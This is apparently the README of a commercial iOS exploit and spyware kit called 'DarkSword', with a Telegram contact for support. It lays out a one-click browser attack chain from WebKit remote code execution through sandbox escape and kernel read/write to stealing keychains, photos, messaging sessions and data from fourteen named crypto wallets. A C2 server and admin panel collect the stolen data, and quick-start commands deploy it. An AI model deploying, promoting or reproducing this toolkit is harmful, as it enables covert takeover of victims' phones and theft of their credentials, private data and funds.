FOR MORE INFORMATION AND TECHNICAL SUPPORT WRITE TO TG @QWRWD123

# DarkSword — iOS Exploit Framework

Browser-based iOS exploit chain: delivery → RCE → sandbox escape → kernel R/W → post-exploitation.

**Coverage:** iOS 18.4 — 26.5 | iPhone XS — 16  
**CVE:** CVE-2025-31277 (18.4), CVE-2025-43529 (18.6)  
**Documented by:** Google Threat Intelligence

## Structure

```
darksword/
├── server/              C2 delivery server + CLI
│   ├── server.py        HTTP server with auto C2 injection (618 lines)
│   ├── cli.py           darksword CLI (serve, sync, info, template)
│   ├── payloads.py      GitHub sync URLs, CVE references
│   ├── config.py        Server configuration
│   └── pyproject.toml   pip package definition
│
├── admin/               Admin panel (FastAPI + Vue 3)
│   ├── main.py          FastAPI application
│   ├── database.py      SQLite models (devices, exfil, wallets)
│   ├── auth.py          JWT authentication
│   ├── schemas.py       Pydantic models
│   ├── routers/         API endpoints
│   │   ├── devices.py   Device management
│   │   ├── exfil.py     Exfiltrated data
│   │   ├── wallets.py   Crypto wallet viewer
│   │   ├── commands.py  Remote command execution
│   │   └── ...
│   └── frontend/        Vue 3 + Vite
│       └── src/views/   13 screens (Dashboard, Wallets, Keychain, SMS, ...)
│
├── payloads/            Attack chain stages
│   ├── delivery/        Landing pages + version router
│   │   ├── index.html   Landing page
│   │   ├── routers.js   iOS version detection → loader selection
│   │   └── rce_loader.js
│   │
│   ├── rce/             WebKit type confusion exploits
│   │   ├── rce_worker_18.4.js     iOS 18.4 (CVE-2025-31277)
│   │   ├── rce_worker_18.5.js     iOS 18.5
│   │   ├── rce_worker_18.6.js     iOS 18.6 (CVE-2025-43529)
│   │   ├── rce_worker_18.7.js     iOS 18.7
│   │   ├── rce_worker_26.3.js     iOS 26.3
│   │   ├── rce_worker_26.x.js     iOS 26.x
│   │   ├── rce_worker_26.5.js     iOS 26.5 (2.4 MB, 47K lines)
│   │   └── rce_worker_26.5_fixed.js
│   │
│   ├── sandbox/         Sandbox escape modules
│   │   ├── sbx0_main_18.4.js     AGX GPU driver exploit
│   │   ├── sbx0_main_26.js       AGX for iOS 26
│   │   ├── sbx1_main.js          PAC bypass + kernel R/W
│   │   ├── sbx1_main_26.js       Kernel R/W for iOS 26 (1.1 MB)
│   │   └── sbx1_built.js         Bundled sandbox escape (2.7 MB)
│   │
│   ├── post-exploit/    Privilege escalation + data theft
│   │   ├── pe_main.js            Main post-exploit orchestrator
│   │   ├── pe_worker.js          Alternative Web Worker path
│   │   ├── pe_worker_body.js     Worker body
│   │   └── post_exploit.js       Command channel (5s polling)
│   │
│   ├── exfil/           Data exfiltration
│   │   ├── keychain_copier.js    Keychain + keybag theft
│   │   ├── photos_upload_v1.js   Photo exfiltration
│   │   ├── session_telegram.js   Telegram session theft
│   │   ├── session_whatsapp.js   WhatsApp session theft
│   │   └── session_probe.js      Session discovery
│   │
│   ├── c2/              C2 implant
│   │   ├── c2_agent.js           Persistent agent
│   │   ├── c2_bootstrap.js       Bootstrap loader
│   │   └── c2_probe.js           Initial probe
│   │
│   └── crypto/          Channel encryption
│       └── channel_crypto_min.js
│
├── src/                 Pre-webpack exploit source
│   ├── main.js          Entry point
│   ├── loader.js        Module loader
│   ├── webpack.config.js
│   ├── libs/
│   │   ├── Chain/
│   │   │   ├── Native.js         Native function bridge (dlsym, callSymbol)
│   │   │   ├── Chain.js          Kernel R/W via AGX GPU
│   │   │   └── OffsetsStruct.js  Device-specific offsets
│   │   ├── Driver/
│   │   │   ├── Driver.js         AGX GPU driver interface
│   │   │   └── OffsetsTable.js   Offset tables per device/build
│   │   ├── TaskRop/
│   │   │   ├── Sandbox.js        120+ iOS paths, launchd token theft
│   │   │   ├── RemoteCall.js     Cross-process function execution
│   │   │   ├── InjectJS.js       JS injection into other processes
│   │   │   ├── VM.js             Kernel VM map walker
│   │   │   ├── PAC.js            Pointer Authentication bypass
│   │   │   ├── Task.js           Mach task manipulation
│   │   │   └── ...
│   │   └── JSUtils/
│   │       ├── FileUtils.js      File read/write helpers
│   │       └── Utils.js          General utilities
│   ├── keychain_copier.js
│   ├── icloud_dumper.js
│   ├── wifi_password_dump.js
│   └── file_downloader.js
│
├── kexploit/            Standalone kernel exploit (Obj-C)
│   ├── src/main.m       IOSurface race + ICMPv6 spray (685 lines)
│   ├── Makefile
│   └── entitlements.plist
│
└── docs/                Screenshots and diagrams
```

## Attack Chain

```
victim clicks link
      │
      ▼
  routers.js ── detects iOS version
      │
      ▼
  rce_worker_XX.js ── WebKit type confusion (addrof/fakeobj)
      │                creates Native bridge (dlsym, callSymbol)
      ▼
  sbx0_main.js ── AGX GPU driver exploit
      │            sandbox escape via launchd (PID 1)
      ▼
  sbx1_main.js ── kernel R/W (testKRW: 0xFEEDFACF)
      │            credential patching
      ▼
  pe_main.js ── InjectJS into configd
      │          keychain_copier.js → keychain-2.db + keybag → /tmp
      │          file_downloader.js → base64 → POST /upload
      ▼
  server.py → SQLite → admin panel → Wallets.vue
```

## 14 Target Wallets

MetaMask, Trust Wallet, Coinbase Wallet, Phantom, imToken, TokenPocket, AlphaWallet, MathWallet, TronLink, ONTO, BitPie, Huobi, Keplr, Cosmostation

## Deployment

See [DEPLOY.md](DEPLOY.md) for full setup guide: server configuration, HTTPS, systemd, firewall, troubleshooting.

Quick start:
```bash
cd server && pip install -e . && darksword serve --c2-host https://your-domain.com
cd admin/frontend && npm install && npm run build
uvicorn admin.main:app --port 8000
```

FOR MORE INFORMATION AND TECHNICAL SUPPORT WRITE TO TG @QWRWD123
